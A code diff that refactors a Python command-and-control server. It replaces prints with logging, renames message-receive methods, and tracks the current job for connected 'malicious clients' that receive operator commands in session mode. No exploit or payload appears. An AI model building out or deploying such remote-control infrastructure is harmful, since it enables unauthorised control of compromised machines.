@@ -236,7 +236,7 @@ class ServerSockHandler:
                 # Create a new thread for this client's communication
                 threading.Thread(
                     target=self.clients[client_name].handle_client,
-                    args=(self.conn, self.ADDR, self.response, self.id)
+                    args=(self.conn, self.response, self.id)
                     ).start()                    
             ## The webserver fake-out
                 """
@@ -324,8 +324,8 @@ class ServerFriendlyClientHandler:
         logging.debug(f"[Server (ServerFriendlyClientHandler)]Friendly Client authenticated, user={self.username}")
 
         while message:
-            print("receving msg from client")
-            raw_user_input = self.recieve_msg_from_client() #bytes_decode(self.conn.recv(1024))
+            #print("receving msg from client")
+            raw_user_input = self.recieve_msg_from_friendlyclient() #bytes_decode(self.conn.recv(1024))
             user_input = self.parse_msg_for_server(raw_user_input)         
 
             logging.debug(f"[client ({self.username}) -> Server] {raw_user_input}")
@@ -497,11 +497,12 @@ class ServerFriendlyClientHandler:
     def client_decision_tree(self, raw_message):
         logging.debug(f"[Client Decision Tree]: {raw_message}")
         message = self.parse_msg_for_client(raw_message)
-        #logging.debug(f"RawMessage={raw_message}")
-        #logging.debug(f"ParsedMessage{message}")
 
-        ## No try except due to parse_msg_for_X having builtin handling
-        
+        # init variables incase of fail
+        client_command = ""
+        client_command_value = ""
+        client_name = ""
+
         try:
             client_command = message[0]
             client_command_value = message[1]
@@ -518,10 +519,12 @@ class ServerFriendlyClientHandler:
         else:
             logging.debug(f"[Server] Client {self.client} not found")
 
+
         if client_command == "session":
+            # setting current_job variable for stat purposes
             self.client.under_control = True
             self.send_msg_to_friendlyclient(f"Session on {self.client.fullname} opened")
-            
+
             ## telling client to go into a listening loop, client sends back an okay, otherwise this hangs
             ## as it's waiting for a response
             self.client.send_msg_to_maliciousclient("session")
@@ -531,24 +534,21 @@ class ServerFriendlyClientHandler:
                 try:
                     ## Need to re-do client to shut up & listen (aka not reconnect) when not getting the "wait" command
                     
-                    print("SESSION LOOP")
                     ## listen for friendly client
                     #a = bytes_decode(self.conn.recv(1024))
-                    raw_session_message = self.recieve_msg_from_client()
+                    raw_session_message = self.recieve_msg_from_friendlyclient()
                     
                     ## msg looks like: !_clientcommand_!\\/id\|/command. This is done for server filtering purposes
                     
                     session_command = raw_session_message.split("\\|/")[2]
-                    
-                    print(session_command)
-                                        
+
+                    # Updating GUI with latest session command
+                    self.client_stats_update(current_job=f"{session_command}", client_name=client_name)
+
                     if session_command == "break":
-                        print("break")
-                        #pass
-                        #self.client.under_control = False
-                    
+                        logging.debug(f"[Server (session: {self.client.fullname})] : Session breaking")
                     else:
-                        print("else")
+                        #print("else")
                         ## sending to client
                         #self.client.send_msg_to_maliciousclient(f"{session_command}\\|/{session_command_value}")
                         
@@ -560,7 +560,6 @@ class ServerFriendlyClientHandler:
                         results = self.client.recieve_msg_from_maliciousclient()
                         self.send_msg_to_friendlyclient(results)
                     
-                    print("loop")
                 except Exception as e:
                     print(e)
         
@@ -570,21 +569,19 @@ class ServerFriendlyClientHandler:
             self.client.send_msg_to_maliciousclient(f"wait\\|/wait")
             ##listening back for response
             results = self.client.recieve_msg_from_maliciousclient()
-        
-        ## if commandfromgui = session
-            ## self.client.under_control = True (tells client to not do checkins)
-            ## results = self.client.send(command)
-            ## self.send_msg_to_Friendlyclient(results)
-        
-        ## at end:
-            #self.client.under_control = False (everything back to normal)
-        
-        
-        #elif client something else:
-            #set job for next checkin (shouldn't be too hard theoretically)
-       
-        
-        
+
+        self.client_stats_update(current_job=f"{client_command} {client_command_value}", client_name=client_name)
+
+    def client_stats_update(self, current_job="", client_name=""):
+        """ An easy way to update the stats on a client, this edits the json file directly
+            Easier to do it here than from the maliciousclienthandlerclass, plus on any errors,
+            this part breaks, not the client handler
+        """
+        logging.debug(f"[Server (client_stats_update: {client_name})] Updating JSON data for this client")
+
+        #json_update(keyname=None, value=None, parent_key=None, client_name=None)
+        Data.json_update(keyname="CurrentJob", value=current_job, parent_key="MaliciousClientHandler", client_name=client_name)
+        Data.json_update(keyname="LatestCheckin", value=datetime.now(timezone.utc), parent_key="MaliciousClientHandler", client_name=client_name)
 
 ################
 ## MSG to Friendly Client stuff
@@ -609,33 +606,34 @@ class ServerFriendlyClientHandler:
         header = str_encode(str(msg_length).zfill(HEADER_BYTES))#.encode()
         
         ## send the header followed by the message in chunks
-        print(f"SENDING HEADER: {header}")
+        logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] SENDING HEADER: {header}")
         try:
             conn.send(header)
         except BrokenPipeError as bpe:
-            logging.debug(f"[Server (send_msg_to_friendlyclient)] Broken pipe, friendly client most likely disconnected, or crashed, closing thread: {bpe}")
+            logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] Broken pipe, friendly client most likely disconnected, or crashed, closing thread: {bpe}")
             ## kills thread, need to make a cleaner way to do this
             exit()
 
         except Exception as e:
-            logging.debug(f"[Server (send_msg_to_friendlyclient)] Error when sending message: {e}")
+            logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] Error when sending message: {e}")
 
-        for i in range(0, math.ceil(msg_length/BUFFER)):
-            
+        chunks = math.ceil(msg_length/BUFFER)
+        for i in range(0, chunks):
             try:
                 ## gets the right spot in the message in a loop
                 chunk = msg[i*BUFFER:(i+1)*BUFFER]
-                print(f"SENDING CHUNK: {chunk}")
+                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] SENDING CHUNK {i+1}/{chunks}")
                 conn.send(str_encode(chunk))
             except Exception as e:
-                print(f"error sending: {e}")
+                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] error sending: {e}")
         
         
         ## does not need to receive any data from client atm. this just sends it back
-        #recv_msg = self.recieve_msg_from_client(conn)
+        #recv_msg = self.recieve_msg_from_friendlyclient(conn)
         #return recv_msg
-            
-    def recieve_msg_from_client(self) -> str:
+
+    # Receive msg form freindly client
+    def recieve_msg_from_friendlyclient(self) -> str:
         conn = self.conn
         complete_msg = ""
         ## clients need to have a shared known header beforehand. Default is 10
@@ -646,35 +644,36 @@ class ServerFriendlyClientHandler:
         
         msg_bytes_recieved_so_far = 0
         
-        print(f"WAITING ON HEADER TO BE SENT:")
+        #print(f"WAITING ON HEADER TO BE SENT:")
         header_msg_length = conn.recv(HEADER_BYTES).decode() #int(bytes_decode(msg)
-        print("HEADER:" + header_msg_length)
+        logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] HEADER: {header_msg_length}")
         
         ## getting the amount of chunks/iterations eneded at 1024 bytes a message
+        ## init chunks as 0 incase it errors out
+        chunks = 0
         try:
             chunks = math.ceil(int(header_msg_length)/BUFFER)
         except ValueError as ve:
-            logging.debug(f"[Server (recieve_msg_from_client)] Error calculating chunk size: {ve}")
-            chunks = 0
-        
+            logging.debug(f"[Server (recieve_msg_from_friendlyclient: {self.username})] Error calculating chunk size: {ve}")
+
         except Exception as e:
-            logging.debug(f"[Server (recieve_msg_from_client)] Unkown Error: {e}")
-        
+            logging.debug(f"[Server (recieve_msg_from_friendlyclient: {self.username})] Unkown Error: {e}")
+
         complete_msg = "" #bytes_decode(msg)[10:]
         
         #while True:
         for i in range(0, chunks):
-            print(f"WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
+
+            logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
             msg = conn.recv(BUFFER)  # << adjustble, how many bytes you want to get per iteration
             
             ## getting the amount of bytes sent so far
             msg_bytes_recieved_so_far = msg_bytes_recieved_so_far + len(bytes_decode(msg))
 
             complete_msg += bytes_decode(msg)
+
             
-            print(bytes_decode(msg))
-            
-            print(f"""DEBUG:
+            '''print(f"""DEBUG:
                 Full Message Length (based on header value) {header_msg_length}
                 Header size: {HEADER_BYTES}
 
@@ -682,13 +681,12 @@ class ServerFriendlyClientHandler:
                 
                 Chunks: {chunks}          
                 
-                """)
+                """)'''
             
             ## if complete_msg is the same length as what the headers says, consider it complete. 
             if len(complete_msg) == header_msg_length:
-                print("MSG TRANSFER COMPLETE")
-        
-        print("VALUE OF MSG: \n" + complete_msg)
+                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] MSG TRANSFER COMPLETE")
+
         return complete_msg
     
 
@@ -751,7 +749,7 @@ class ServerMaliciousClientHandler:
     def __init__(self):
         self.first_time = 0
         # setting current job to none to start
-        self.current_job = None
+
 
         ## stats
         self.stats_heartbeats = 0
@@ -763,16 +761,15 @@ class ServerMaliciousClientHandler:
         self.Sx12 = "[Server] A malicious client tried to connect without a valid ID:"
 
 
-    def handle_client(self, conn, addr, message, id):
-        
+    def handle_client(self, conn, message, id):
         self.conn = conn
-        self.addr = addr
-        self.ip = addr[0]
-        self.port = addr[1]
+        self.ip = self.conn.getpeername()[0]
+        self.port = self.conn.getpeername()[1]
         self.id = id
         ## ugly yes, but it works for now. 
         self.fullname = "client_" + self.ip.replace(".","_") + f"_{self.id}"
         self.under_control = False
+        self.current_job = "Wait"
         
         self.data_list = [
             self.stats_heartbeats,
@@ -780,24 +777,25 @@ class ServerMaliciousClientHandler:
             self.stats_jobsrun,
             self.stats_latestcheckin
         ]
-        
+
+        self.handle_stats()
+
+
+    def handle_stats(self):
         new_client = {
             "ClientFullName": f"{self.fullname}",
             "ClientIP": f"{self.ip}",
             "ClientPort": f"{self.port}",
             "ClientId": f"{self.id}",
             "CurrentJob": f"{self.current_job}",
-            "SleepTime": "60",
+            "SleepTime": f"{self.stats_heartbeat_timer}",
             "LatestCheckin": str(datetime.now(timezone.utc)),
             "FirstCheckin": str(datetime.now(timezone.utc)),
             "Active": "yes"
         }
-        
-        ## creating json for client
-        #client_127_0_0_1_FAUNI
         ## Runs every checkin, howeer the method will not write data if a record of this client exists
         Data.json_new_client(json.dumps(new_client))
-    
+
     def cleanup(self):
         self.current_job = "wait\\|/wait"
     
@@ -816,18 +814,19 @@ class ServerMaliciousClientHandler:
         header = str_encode(str(msg_length).zfill(HEADER_BYTES))#.encode()
         
         ## send the header followed by the message in chunks
-        print(f"SENDING HEADER: {header}")
+        logging.debug(f"[Server (send_msg_to_maliciousclient: {self.id})] SENDING HEADER: {header}")
         conn.send(header)
-        
-        for i in range(0, math.ceil(msg_length/BUFFER)):
+
+        chunks = math.ceil(msg_length/BUFFER)
+        for i in range(0, chunks):
             
             try:
                 ## gets the right spot in the message in a loop
                 chunk = msg[i*BUFFER:(i+1)*BUFFER]
-                print(f"SENDING CHUNK: {chunk}")
+                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.id})] SENDING CHUNK {i+1}/{chunks}")
                 conn.send(str_encode(chunk))
             except Exception as e:
-                print(f"error sending: {e}")
+                logging.debug(f"[Server (send_msg_to_maliciousclient: {self.id})] error sending: {e}")
         
         #recv_msg = self.recieve_msg_from_maliciousclient()
         #return recv_msg
@@ -843,9 +842,9 @@ class ServerMaliciousClientHandler:
         
         msg_bytes_recieved_so_far = 0
         
-        print(f"WAITING ON HEADER TO BE SENT:")
+        logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] WAITING ON HEADER TO BE SENT:")
         header_msg_length = conn.recv(HEADER_BYTES).decode() #int(bytes_decode(msg)
-        print("HEADER:" + header_msg_length)
+        logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] HEADER: {header_msg_length}")
         
         ## getting the amount of chunks/iterations eneded at 1024 bytes a message
         chunks = math.ceil(int(header_msg_length)/BUFFER)
@@ -854,17 +853,15 @@ class ServerMaliciousClientHandler:
         
         #while True:
         for i in range(0, chunks):
-            print(f"WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
+            logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
             msg = conn.recv(BUFFER)  # << adjustble, how many bytes you want to get per iteration
             
             ## getting the amount of bytes sent so far
             msg_bytes_recieved_so_far = msg_bytes_recieved_so_far + len(bytes_decode(msg))
 
             complete_msg += bytes_decode(msg)
-            
-            print(bytes_decode(msg))
-            
-            print(f"""DEBUG:
+
+            '''print(f"""DEBUG:
                 Full Message Length (based on header value) {header_msg_length}
                 Header size: {HEADER_BYTES}
 
@@ -872,13 +869,12 @@ class ServerMaliciousClientHandler:
                 
                 Chunks: {chunks}          
                 
-                """)
+                """)'''
             
             ## if complete_msg is the same length as what the headers says, consider it complete. 
             if len(complete_msg) == header_msg_length:
-                print("MSG TRANSFER COMPLETE")
-        
-        print("VALUE OF MSG: \n" + complete_msg)
+                logging.debug(f"[Server (recieve_msg_from_maliciousclient: {self.id})] MSG TRANSFER COMPLETE")
+
         return complete_msg
             
 
@@ -977,7 +973,7 @@ class Data:
         #pass
     @staticmethod
     def json_new_client(client_data_raw):
-        print(type(client_data_raw))
+        #print(type(client_data_raw))
         """ Creates a new client section/appendage to the json data, that json object is created in handle_client,
         and is passed here. the defualt_malicious_client is for reference
         
@@ -985,8 +981,8 @@ class Data:
         """
         client_data = json.loads(client_data_raw)
 
-        print(type(client_data))
-        print(client_data)
+        #print(type(client_data))
+        #print(client_data)
         
         #writing to json file
         with open("server_json.json", "r+") as json_file:
